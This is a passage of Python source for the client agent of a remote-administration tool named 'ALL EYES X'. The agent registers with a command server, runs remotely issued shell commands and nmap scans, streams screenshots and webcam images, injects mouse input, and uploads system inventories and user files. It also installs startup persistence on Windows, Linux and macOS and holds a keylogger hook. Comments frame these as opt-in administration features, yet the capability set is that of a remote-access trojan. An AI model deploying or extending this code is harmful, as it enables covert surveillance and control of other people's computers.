            addr = addr_node.get('addr', '') if addr_node is not None else ''
            host_item = {'address': addr, 'ports': []}
            for port in host.findall('./ports/port'):
                state_node = port.find('state')
                service_node = port.find('service')
                state = state_node.get('state', '') if state_node is not None else ''
                service = service_node.get('name', '') if service_node is not None else ''
                product = service_node.get('product', '') if service_node is not None else ''
                version = service_node.get('version', '') if service_node is not None else ''
                item = {
                    'protocol': port.get('protocol', ''),
                    'port': int(port.get('portid', '0')),
                    'state': state,
                    'service': service,
                    'product': product,
                    'version': version,
                }
                host_item['ports'].append(item)
                if state == 'open':
                    parsed['open_ports'].append({'host': addr, **item})
            parsed['hosts'].append(host_item)
    except Exception as e:
        parsed['parse_error'] = str(e)
    return parsed


def run_nmap_scan(scan_type, target):
    if not shutil.which('nmap'):
        return {'success': False, 'result': '', 'parsed': {}, 'error': 'Nmap is not installed or not in PATH'}
    target = validate_scan_target(target)
    profiles = {
        'ping': ['nmap', '-oX', '-', '-sn', target],
        'top_ports': ['nmap', '-oX', '-', '--top-ports', '100', target],
        'service': ['nmap', '-oX', '-', '-sV', '--top-ports', '100', target],
        'os': ['nmap', '-oX', '-', '-O', '--top-ports', '100', target],
        'udp_light': ['nmap', '-oX', '-', '-sU', '--top-ports', '20', target],
        'vuln_safe': ['nmap', '-oX', '-', '-sV', '--script', 'safe,vuln', '--top-ports', '100', target],
    }
    if scan_type not in profiles:
        return {'success': False, 'result': '', 'parsed': {}, 'error': 'Invalid Nmap scan type'}
    try:
        proc = subprocess.run(profiles[scan_type], capture_output=True, timeout=300, text=True)
        output = proc.stdout or proc.stderr or ''
        parsed = parse_nmap_xml(proc.stdout) if proc.stdout else {}
        return {'success': proc.returncode == 0, 'result': output[:50000], 'parsed': parsed, 'error': '' if proc.returncode == 0 else (proc.stderr[:2000] or 'nmap failed')}
    except subprocess.TimeoutExpired:
        return {'success': False, 'result': '', 'parsed': {}, 'error': 'Nmap scan timed out'}
    except Exception as e:
        return {'success': False, 'result': '', 'parsed': {}, 'error': str(e)}


# ============================================================
# REMOTE COMMAND EXECUTION
# ============================================================
def resolve_managed_command(command):
    """Map ALL EYES X terminal aliases to bounded, defensive admin commands.

    Raw shell execution is disabled by default. To use it in a controlled lab,
    start the agent with ALLEYESX_ALLOW_RAW_COMMANDS=1 and prefix commands with
    shell:. All executions are still timed out by execute_command().
    """
    cmd = (command or '').strip()
    key = cmd.lower()

    if key.startswith('shell:'):
        if os.environ.get('ALLEYESX_ALLOW_RAW_COMMANDS') == '1':
            return cmd[6:].strip()
        raise PermissionError('Raw shell commands are disabled on this agent')

    win = sys.platform == 'win32'
    mac = sys.platform == 'darwin'

    if win:
        commands = {
            'sys_info': 'systeminfo',
            'os_info': 'wmic os get Caption,Version,BuildNumber,OSArchitecture /format:list',
            'hostname': 'hostname',
            'whoami': 'whoami',
            'uptime': 'powershell -NoProfile -Command "(Get-CimInstance Win32_OperatingSystem).LastBootUpTime"',
            'cpu_info': 'wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed',
            'cpu_usage': 'powershell -NoProfile -Command "Get-CimInstance Win32_Processor | Select-Object LoadPercentage"',
            'mem_info': 'wmic computersystem get TotalPhysicalMemory',
            'mem_usage': 'powershell -NoProfile -Command "Get-CimInstance Win32_OperatingSystem | Select-Object FreePhysicalMemory,TotalVisibleMemorySize"',
            'disk_usage': 'wmic logicaldisk get DeviceID,Size,FreeSpace,FileSystem,VolumeName',
            'disk_list': 'wmic diskdrive get Model,Size,Status,InterfaceType',
            'ip_config': 'ipconfig /all',
            'net_interfaces': 'netsh interface show interface',
            'route_table': 'route print',
            'arp_table': 'arp -a',
            'dns_cache': 'ipconfig /displaydns',
            'net_stat': 'netstat -ano',
            'listening_ports': 'netstat -ano | findstr LISTENING',
            'firewall_status': 'netsh advfirewall show allprofiles state',
            'firewall_rules': 'netsh advfirewall firewall show rule name=all',
            'defender_status': 'powershell -NoProfile -Command "Get-MpComputerStatus"',
            'process_list': 'tasklist /v',
            'services_list': 'sc query type= service state= all',
            'startup_items': 'wmic startup get Caption,Command,Location,User',
            'scheduled_tasks': 'schtasks /query /fo LIST /v',
            'users': 'net user',
            'logged_user': 'whoami /user',
            'sessions': 'query user',
            'env_vars': 'set',
            'installed_apps': 'wmic product get Name,Version',
            'hotfixes': 'wmic qfe list brief',
            'event_errors': 'wevtutil qe System /c:30 /rd:true /f:text /q:"*[System[(Level=2)]]"',
            'event_security_recent': 'wevtutil qe Security /c:30 /rd:true /f:text',
            'usb_devices': 'wmic path Win32_USBControllerDevice get Dependent',
            'battery_status': 'wmic path Win32_Battery get BatteryStatus,EstimatedChargeRemaining',
            'wifi_status': 'netsh wlan show interfaces',
            'wifi_profiles': 'netsh wlan show profiles',
            'shares': 'net share',
            'printers': 'wmic printer get Name,Default,WorkOffline',
            'drivers': 'driverquery /v',
            'current_dir': 'cd',
            'list_home': 'dir %USERPROFILE%',
            'temp_usage': 'dir %TEMP%',
            'python_version': 'python --version',
            'agent_status': 'echo ALL EYES X agent online',
            'ping_gateway': 'powershell -NoProfile -Command "$gw=(Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Select-Object -First 1).NextHop; ping $gw"',
            'trace_dns': 'tracert 8.8.8.8',
            'net_accounts': 'net accounts',
            'lock_screen': 'rundll32.exe user32.dll,LockWorkStation',
            'reboot': 'shutdown /r /t 60 /c "ALL EYES X authorized reboot requested"',
            'shutdown': 'shutdown /s /t 60 /c "ALL EYES X authorized shutdown requested"',
        }
    else:
        service_cmd = 'launchctl list' if mac else 'systemctl list-units --type=service --no-pager'
        commands = {
            'sys_info': 'uname -a',
            'os_info': 'sw_vers 2>/dev/null || cat /etc/os-release',
            'hostname': 'hostname',
            'whoami': 'whoami',
            'uptime': 'uptime',
            'cpu_info': 'sysctl -n machdep.cpu.brand_string 2>/dev/null || lscpu',
            'cpu_usage': 'top -l 1 -n 0 2>/dev/null | head -10 || top -bn1 | head -10',
            'mem_info': 'vm_stat 2>/dev/null || free -h',
            'mem_usage': 'vm_stat 2>/dev/null || free -h',
            'disk_usage': 'df -h',
            'disk_list': 'diskutil list 2>/dev/null || lsblk',
            'ip_config': 'ifconfig || ip addr',
            'net_interfaces': 'networksetup -listallhardwareports 2>/dev/null || ip link',
            'route_table': 'netstat -rn',
            'arp_table': 'arp -a',
            'dns_cache': 'scutil --dns 2>/dev/null || resolvectl status 2>/dev/null || cat /etc/resolv.conf',
            'net_stat': 'netstat -tunap 2>/dev/null || netstat -anv',
            'listening_ports': 'lsof -i -P -n | grep LISTEN 2>/dev/null || netstat -lntup',
            'firewall_status': 'pfctl -s info 2>/dev/null || ufw status 2>/dev/null || firewall-cmd --state 2>/dev/null',
            'firewall_rules': 'pfctl -sr 2>/dev/null || ufw status numbered 2>/dev/null || iptables -S 2>/dev/null',
            'defender_status': 'echo Platform security status not reported by this agent',
            'process_list': 'ps aux',
            'services_list': service_cmd,
            'startup_items': 'ls -la ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null || ls -la ~/.config/autostart /etc/systemd/system',
            'scheduled_tasks': 'crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null',
            'users': 'dscl . list /Users 2>/dev/null || cut -d: -f1 /etc/passwd',
            'logged_user': 'id',
            'sessions': 'who',
            'env_vars': 'env',
            'installed_apps': 'ls /Applications 2>/dev/null || dpkg -l 2>/dev/null || rpm -qa 2>/dev/null',
            'hotfixes': 'softwareupdate --history 2>/dev/null || grep " install " /var/log/dpkg.log 2>/dev/null | tail -50',
            'event_errors': 'log show --last 1h --predicate "eventType == logEvent" 2>/dev/null | tail -100 || journalctl -p err -n 100 --no-pager',
            'event_security_recent': 'log show --last 1h 2>/dev/null | tail -100 || journalctl -n 100 --no-pager',
            'usb_devices': 'system_profiler SPUSBDataType 2>/dev/null || lsusb',
            'battery_status': 'pmset -g batt 2>/dev/null || upower -i $(upower -e | grep BAT | head -1) 2>/dev/null',
            'wifi_status': 'networksetup -getairportnetwork en0 2>/dev/null || iw dev 2>/dev/null',
            'wifi_profiles': 'networksetup -listpreferredwirelessnetworks en0 2>/dev/null || ls /etc/NetworkManager/system-connections 2>/dev/null',
            'shares': 'sharing -l 2>/dev/null || smbstatus -S 2>/dev/null',
            'printers': 'lpstat -p 2>/dev/null',
            'drivers': 'kextstat 2>/dev/null || lsmod',
            'current_dir': 'pwd',
            'list_home': 'ls -la ~',
            'temp_usage': 'du -sh /tmp 2>/dev/null; ls -la /tmp | head -50',
            'python_version': 'python3 --version || python --version',
            'agent_status': 'echo ALL EYES X agent online',
            'ping_gateway': 'gw=$(route -n get default 2>/dev/null | awk "/gateway/ {print $2}" || ip route | awk "/default/ {print $3; exit}"); ping -c 4 "$gw"',
            'trace_dns': 'traceroute 8.8.8.8 2>/dev/null || tracepath 8.8.8.8',
            'net_accounts': 'passwd -S $(whoami) 2>/dev/null || dscl . read /Users/$(whoami) 2>/dev/null',
            'lock_screen': 'pmset displaysleepnow 2>/dev/null || loginctl lock-session 2>/dev/null',
            'reboot': 'echo Reboot requires local authorization on this platform',
            'shutdown': 'echo Shutdown requires local authorization on this platform',
        }

    if key not in commands:
        raise ValueError(f'Unknown managed command: {command}. Use help in the terminal for supported commands.')
    return commands[key]


def execute_command(command):
    try:
        resolved = resolve_managed_command(command)
        result = subprocess.run(resolved, shell=True, capture_output=True, timeout=60, text=True)
        output = result.stdout or result.stderr or ''
        return {'success': result.returncode == 0, 'result': output[:10000]}
    except subprocess.TimeoutExpired:
        return {'success': False, 'result': 'Command timed out'}
    except Exception as e:
        return {'success': False, 'result': str(e)}


# ============================================================
# TOUCH/MOUSE EVENT HANDLING
# ============================================================
def handle_touch_event(event_data):
    if not capability_profile().get('remote_input'):
        return False
    try:
        import pyautogui
    except ImportError:
        try:
            from pynput.mouse import Controller, Button
            mouse = Controller()
            event_type = event_data.get('event', '')
            x = event_data.get('x', 0)
            y = event_data.get('y', 0)
            
            if event_type == 'down':
                mouse.position = (x, y)
                mouse.press(Button.left)
            elif event_type == 'move':
                mouse.position = (x, y)
            elif event_type == 'up':
                mouse.release(Button.left)
            return True
        except ImportError:
            return False
    
    try:
        event_type = event_data.get('event', '')
        x = event_data.get('x', 0)
        y = event_data.get('y', 0)
        
        if event_type == 'down':
            pyautogui.moveTo(x, y)
            pyautogui.mouseDown()
        elif event_type == 'move':
            pyautogui.moveTo(x, y)
        elif event_type == 'up':
            pyautogui.mouseUp()
        return True
    except:
        return False


# ============================================================
# PERSISTENCE
# ============================================================
def ensure_persistence():
    if os.environ.get('ALLEYESX_ENABLE_PERSISTENCE') != '1':
        print('[*] Persistence disabled. Set ALLEYESX_ENABLE_PERSISTENCE=1 to enable authorized startup registration.')
        return False
    if not capability_profile().get('persistence'):
        print('[*] Persistence not supported on this platform profile.')
        return False
    script_path = os.path.abspath(__file__)
    if sys.platform == 'win32':
        return persist_windows(script_path)
    elif sys.platform == 'linux':
        return persist_linux(script_path)
    elif sys.platform == 'darwin':
        return persist_macos(script_path)
    return False


def persist_windows(script_path):
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, 'ALLEYESX', 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
        return True
    except:
        pass
    try:
        task_name = 'ALLEYESX_Agent'
        cmd = f'schtasks /create /tn "{task_name}" /tr "pythonw.exe \\"{script_path}\\"" /sc onlogon /rl highest /f'
        subprocess.run(cmd, shell=True, timeout=10, capture_output=True)
        return True
    except:
        pass
    return False


def persist_linux(script_path):
    try:
        autostart_dir = os.path.expanduser('~/.config/autostart')
        os.makedirs(autostart_dir, exist_ok=True)
        desktop_content = f"""[Desktop Entry]
Type=Application
Name=ALLEYESX
Exec=/usr/bin/python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
        with open(os.path.join(autostart_dir, 'alleyesx.desktop'), 'w') as f:
            f.write(desktop_content)
        return True
    except:
        pass
    try:
        cron_line = f'@reboot /usr/bin/python3 {script_path} &\n'
        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=10)
        existing = result.stdout
        if cron_line not in existing:
            new_cron = existing + cron_line
            subprocess.run(['crontab', '-'], input=new_cron, text=True, timeout=10)
            return True
    except:
        pass
    return False


def persist_macos(script_path):
    try:
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.alleyesx.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
        launch_dir = os.path.expanduser('~/Library/LaunchAgents')
        os.makedirs(launch_dir, exist_ok=True)
        plist_path = os.path.join(launch_dir, 'com.alleyesx.agent.plist')
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        subprocess.run(['launchctl', 'load', '-w', plist_path], timeout=10, capture_output=True)
        return True
    except:
        pass
    return False


# ============================================================
# KEYLOGGER
# ============================================================
def start_keylogger():
    try:
        from pynput import keyboard
    except ImportError:
        return None

    def on_press(key):
        pass  # Can be extended to capture keystrokes

    def keylog_loop():
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    thread = threading.Thread(target=keylog_loop, daemon=True)
    thread.start()
    return thread


# ============================================================
# MAIN CLIENT
# ============================================================
class ALLEYESXClient:
    def __init__(self):
        # Fall back to a generated identity when DEVICE_ID has not been set yet
        # (module import, embedding, or wrapper scripts).
        self.device_id = DEVICE_ID or generate_device_id()
        self.running = True
        self.registered = False
        self.last_heartbeat_time = 0.0
        # Camera capture is OFF until an administrator explicitly starts it.
        # Streaming the webcam continuously was both a privacy problem and a
        # waste of CPU on a modest machine.
        self.webcam_enabled = False
        self.webcam_camera = 'front'
        self.last_software_report_time = 0.0
        self.last_screenshot_time = 0
        self.last_webcam_time = 0
        self.last_touch_poll_time = 0
        self.last_hardware_report_time = 0
        self.keylogger_thread = None
        self.touch_event_id = 0

    def register(self):
        sys_info = get_system_info()
        attempt = 0
        while True:
            attempt += 1
            result = api_request('/api/register', sys_info)
            if result.get('success'):
                server_id = result.get('device_id', '')
                if server_id:
                    self.device_id = server_id
                    global DEVICE_ID
                    DEVICE_ID = server_id
                self.registered = True
                print(f"[+] Registered successfully as {self.device_id}")
                print(f"[+] Hostname: {sys_info['hostname']}")
                print(f"[+] OS: {sys_info['os']} {sys_info['os_version']}")
                print(f"[+] IP: {sys_info['ip']}")
                print(f"[+] Server: {SERVER_URL}")

                # === NOW SEND FULL HARDWARE INVENTORY ===
                print("[*] Collecting hardware inventory...")
                inventory = collect_hardware_inventory()
                print(f"[*] Sending hardware inventory ({sum(len(v) if isinstance(v, list) else 1 for v in inventory.values())} items)...")
                
                hw_result = api_request(f'/api/device/{self.device_id}/hardware', inventory)
                if hw_result.get('success'):
                    print("[+] Hardware inventory submitted successfully")
                else:
                    print(f"[-] Hardware submission result: {hw_result}")
                
                return True
            
            wait = min(5 * attempt, 60)
            err_msg = result.get('error', result.get('message', 'Unknown error'))
            print(f"[-] Registration attempt {attempt} failed: {err_msg}")
            print(f"[*] Retrying in {wait}s...")
            time.sleep(wait)

    def heartbeat(self):
        if not self.registered:
            self.register()
            return

        # Rate-limit the heartbeat. It is called every loop iteration, and the
        # loop now ticks as fast as the stream interval (up to ~50 Hz), so
        # without this guard the agent would post 50 heartbeats per second.
        now = time.time()
        if now - self.last_heartbeat_time < HEARTBEAT_INTERVAL:
            return
        self.last_heartbeat_time = now

        payload = {
            'device_id': self.device_id,
            'ip': get_local_ip(),
        }
        payload.update(collect_security_telemetry())

        result = api_request('/api/heartbeat', payload)

        if result.get('error'):
            err = str(result.get('error', ''))
            if 'Unknown device' in err:
                self.registered = False
                print("[-] Server lost our identity. Re-registering...")
                return
            # A heartbeat failure used to be swallowed completely. The device
            # then went offline on the server after 30s with nothing printed
            # here, which is exactly the "appears then disappears" symptom with
            # no way to tell why. Report the first failure, then every 12th
            # (~1/minute) so a long outage is visible without flooding the log.
            self._hb_failures = getattr(self, '_hb_failures', 0) + 1
            if self._hb_failures == 1 or self._hb_failures % 12 == 0:
                print(
                    f"[-] Heartbeat failed ({self._hb_failures} in a row): {err}. "
                    f"Server may mark this node offline after 30s of silence."
                )
            return

        if getattr(self, '_hb_failures', 0):
            print(f"[+] Heartbeat recovered after {self._hb_failures} failure(s)")
            self._hb_failures = 0

        pending_tasks = result.get('pending_tasks', [])
        if pending_tasks:
            for task in pending_tasks:
                self.handle_task(task)

    def show_user_notice(self, message):
        """Display a visible on-screen notice to the person at the machine."""
        if not message:
            return
        print(f"[!] USER NOTICE: {message}")
        kind = platform_kind()
        try:
            if kind == 'windows':
                ps = (
                    "Add-Type -AssemblyName System.Windows.Forms;"
                    "[System.Windows.Forms.MessageBox]::Show("
                    + repr(message) + ", 'ALL EYES X — Administrator Notice')"
                )
                threading.Thread(
                    target=lambda: subprocess.run(
                        ['powershell', '-NoProfile', '-Command', ps],
                        capture_output=True, timeout=120,
                    ),
                    daemon=True,
                ).start()
                return
            if kind in ('linux', 'macos'):
                for cmd in (['notify-send', 'ALL EYES X', message],
                            ['osascript', '-e', f'display notification "{message}" with title "ALL EYES X"']):
                    if shutil.which(cmd[0]):
                        threading.Thread(
                            target=lambda c=cmd: subprocess.run(c, capture_output=True, timeout=30),
                            daemon=True,
                        ).start()
                        return
        except Exception as e:
            print(f"[-] Could not display user notice: {e}")

    def handle_task(self, task):
        task_type = task.get('type', 'command')
        task_id = task.get('id', '')

        if task_type == 'webcam_command':
            self.apply_webcam_command(task)
            return

        if task_type == 'notify_user':
            # Visible, non-blocking notice. The remote user is told the
            # administrator has taken control - the session is never silent.
            self.show_user_notice(task.get('message', ''))
            return

        if task_type == 'nmap_scan':
            scan_type = task.get('scan_type', 'top_ports')
            target = task.get('target', '')
            print(f"[*] Running authorized Nmap scan: {scan_type} {target}")
            result = run_nmap_scan(scan_type, target)
            api_request('/api/security/nmap/result', {
                'device_id': self.device_id,
                'scan_id': task_id,
                'success': result['success'],
                'result': result.get('result', ''),
                'parsed': result.get('parsed', {}),
                'error': result.get('error', ''),
            })
            print(f"[+] Nmap result sent ({'success' if result['success'] else 'failed'})")
            return

        if task_type == 'command':
            command = task.get('command', '')
            print(f"[*] Executing command: {command[:50]}...")
            result = execute_command(command)
            api_request('/api/command/result', {
                'device_id': self.device_id,
                'command_id': task_id,
                'result': result['result'],
                'success': result['success']
            })
            print(f"[+] Command result sent ({len(result['result'])} bytes)")

    def send_hardware_inventory(self):
        """Re-submit the FULL hardware inventory on an interval.

        Previously this only sent processor + memory, so the Device Detail page
        kept showing N/A for OS edition, GPU, storage, network interfaces and
        peripherals even though the agent could read all of them. Sending the
        whole inventory every HARDWARE_REPORT_INTERVAL seconds fills those
        panels with real values and keeps live usage fresh.
        """
        now = time.time()
        if now - self.last_hardware_report_time < HARDWARE_REPORT_INTERVAL:
            return
        self.last_hardware_report_time = now

        try:
            update = collect_hardware_inventory()
        except Exception as e:
            print(f"[-] Hardware inventory collection failed: {e}")
            return

        result = api_request(f'/api/device/{self.device_id}/hardware', update)
        if result.get('success'):
            proc = update.get('processor') or {}
            mem = update.get('memory') or {}
            print(
                "[*] Hardware inventory refreshed "
                f"(CPU {proc.get('usage_percent', '?')}%, RAM {mem.get('usage_percent', '?')}%, "
                f"gpu={len(update.get('graphics') or [])}, disks={len(update.get('storage') or [])}, "
                f"nics={len(update.get('network_interfaces') or [])})"
            )
        else:
            print(f"[-] Hardware inventory rejected: {result.get('error', 'unknown')}")

    def send_software_inventory(self):
        """Upload apps/files/media on a slow interval (default 10 minutes)."""
        now = time.time()
        if now - self.last_software_report_time < SOFTWARE_REPORT_INTERVAL:
            return
        self.last_software_report_time = now
        try:
            payload = collect_software_inventory()
        except Exception as e:
            print(f"[-] Software inventory collection failed: {e}")
            return
        result = api_request(f'/api/device/{self.device_id}/software', payload)
        if result.get('success'):
            apps = (payload.get('installed_apps') or {}).get('count', 0)
            files = len((payload.get('user_files') or {}).get('files', []))
            print(f"[*] Software inventory refreshed ({apps} apps, {files} files)")
        else:
            print(f"[-] Software inventory rejected: {result.get('error', 'unknown')}")

    def poll_touch_events(self):
        now = time.time()
        if now - self.last_touch_poll_time < TOUCH_POLL_INTERVAL:
            return
        self.last_touch_poll_time = now
        
        try:
            result = api_request(f'/api/touch/poll/{self.device_id}', method='GET')
            if result and 'events' in result:
                events = result['events']
                if events:
                    for event in events:
                        event_id = event.get('id', 0)
                        if event_id > self.touch_event_id:
                            self.touch_event_id = event_id
                            handle_touch_event(event)
                            api_request(f'/api/touch/ack/{self.device_id}', {'event_id': event_id})
        except:
            pass

    def send_screenshot(self):
        now = time.time()
        if now - self.last_screenshot_time < SCREENSHOT_INTERVAL:
            return
        self.last_screenshot_time = now
        
        try:
            result = capture_screenshot()
            if result is None:
                return
            api_request_raw(f'/api/screenshot/{self.device_id}', result)
        except:
            pass

    def send_webcam(self):
        if not self.webcam_enabled:
            return
        now = time.time()
        if now - self.last_webcam_time < WEBCAM_INTERVAL:
            return
        self.last_webcam_time = now

        try:
            image_b64 = capture_webcam(camera=self.webcam_camera)
            if image_b64:
                api_request_raw(f'/api/webcam/{self.device_id}', {'image': image_b64})
        except Exception as e:
            print(f"[-] Webcam capture failed: {e}")
            self.webcam_enabled = False

    def apply_webcam_command(self, task):
        """Handle start / stop / switch delivered over the heartbeat queue."""
        cmd = (task.get('command') or '').lower()
        if cmd == 'start':
            self.webcam_camera = task.get('camera', 'front')
            self.webcam_enabled = True
            print(f"[+] Webcam streaming ENABLED by administrator (camera={self.webcam_camera})")
        elif cmd == 'stop':
            self.webcam_enabled = False
            print("[-] Webcam streaming disabled")
        elif cmd == 'switch':
            self.webcam_camera = task.get('camera', 'front')
            print(f"[*] Webcam switched to {self.webcam_camera}")

    def run(self):
        print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║     ALL EYES X — Client Agent v3.3                          ║
    ║     Full Hardware Inventory + Live Stats                    ║
    ║                                                              ║
    ║     ENHANCEMENTS:                                            ║
    ║     • Complete OS detection (edition, kernel, build)         ║
    ║     • CPU model, cores, threads, clock speed, live usage     ║
    ║     • RAM capacity, speed, type, slots, live usage           ║
    ║     • GPU name, VRAM, driver, manufacturer                  ║
    ║     • Storage: capacity, used/free, drive type              ║
    ║     • Network: IP, MAC, speed, interface type               ║
    ║     • Peripherals: USB, printers, bluetooth                 ║
    ║     • BIOS/Motherboard/Serial hardware info                 ║
    ╚══════════════════════════════════════════════════════════════╝
        """)
        print(f"[*] Device ID: {self.device_id}")
        print(f"[*] Server: {SERVER_URL}")
        caps = capability_profile()
        print(f"[*] Platform: {sys.platform} ({caps['platform']})")
        print(f"[*] Capabilities: telemetry={caps['telemetry']} hardware={caps['hardware_inventory']} screenshot={caps['screenshot']} webcam={caps['webcam']} input={caps['remote_input']} nmap={caps['nmap']}")
        if caps.get('limited_reason'):
            print(f"[*] Limited mode: {caps['limited_reason']}")
        print(f"[*] Stream profile: {STREAM_PROFILE} ({STREAM_TARGET_FPS} FPS target)")
        print(f"[*] Screenshot: {1/SCREENSHOT_INTERVAL:.0f} FPS target")
        print(f"[*] Webcam: {1/WEBCAM_INTERVAL:.0f} FPS target")
        print()
        
        self.register()
        
        try:
            if ensure_persistence():
                print("[+] Persistence installed")
        except:
            pass
        
        # Keystroke capture is disabled by default. It must not run silently.
        # Future authorized session flows can enable explicit, logged input diagnostics.
        if os.environ.get('ALLEYESX_ENABLE_KEYLOG_DIAGNOSTIC') == '1':
            try:
                self.keylogger_thread = start_keylogger()
                if self.keylogger_thread:
                    print("[+] Input diagnostic capture started (explicit opt-in)")
            except:
                pass
        
        print()
        print("[*] Entering main loop...")
        print()
        
        screenshot_counter = 0
        fps_timer = time.time()
        webcam_counter = 0
        
        while self.running:
            try:
                loop_start = time.time()
                
                self.heartbeat()
                self.poll_touch_events()
                self.send_screenshot()
                self.send_webcam()
                self.send_hardware_inventory()
                self.send_software_inventory()
                
                screenshot_counter += 1
                webcam_counter += 1
                
                now = time.time()
                if now - fps_timer >= 5:
                    screen_fps = screenshot_counter / (now - fps_timer)
                    cam_fps = webcam_counter / (now - fps_timer)
                    print(f"[*] Screen: {screen_fps:.1f} FPS | Webcam: {cam_fps:.1f} FPS")
                    screenshot_counter = 0
                    webcam_counter = 0
                    fps_timer = now
                
                elapsed = time.time() - loop_start

                # The loop period must be at least as fast as the quickest
                # active interval, otherwise this sleep silently caps the stream.
                # A fixed 0.05s floor limited everything to 20 FPS no matter what
                # SCREENSHOT_INTERVAL said, which is why 50-60 FPS was unreachable.
                tick = min(SCREENSHOT_INTERVAL, WEBCAM_INTERVAL, TOUCH_POLL_INTERVAL)
                loop_period = max(0.002, min(tick, 0.25))
                sleep_time = loop_period - elapsed
                if sleep_time > 0:
                    time.sleep(sleep_time)
                else:
                    # Yield to other greenthreads/OS work without busy-spinning.
                    time.sleep(0.001)
                
            except KeyboardInterrupt:
                print("\n[*] Shutting down...")
                self.running = False
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                time.sleep(HEARTBEAT_INTERVAL)


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == '__main__':
    if len(sys.argv) > 1:
        SERVER_URL = sys.argv[1]
    else:
        SERVER_URL = os.environ.get('ALL_EYES_SERVER', SERVER_URL)
    
    DEVICE_ID = generate_device_id()
    client = ALLEYESXClient()
    client.run()